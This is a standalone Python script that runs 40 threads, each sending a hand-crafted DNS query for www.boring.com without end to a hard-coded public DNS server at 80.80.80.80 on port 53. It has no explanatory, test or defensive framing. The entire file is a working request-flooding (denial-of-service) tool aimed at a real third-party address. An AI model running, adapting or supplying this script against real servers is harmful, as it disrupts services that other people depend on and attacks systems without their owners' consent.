import threading
import random
import time
import socket

# Target DNS server and port
target_server = '80.80.80.80'
target_port = 53

# Number of threads
num_threads = 40

# DNS request template
dns_request_template = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06boring\x03com\x00\x00\x01\x00\x01'

# Function to send DNS request
def send_dns_request():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(dns_request_template, (target_server, target_port))
            sock.close()
            time.sleep(random.uniform(0.1, 0.5))  # To avoid flooding too fast
        except Exception as e:
            print(f"Error: {e}")

# Creating and starting threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_dns_request)
    thread.daemon = True
    threads.append(thread)
    thread.start()

# Keeping the main thread alive
while True:
    time.sleep(1)
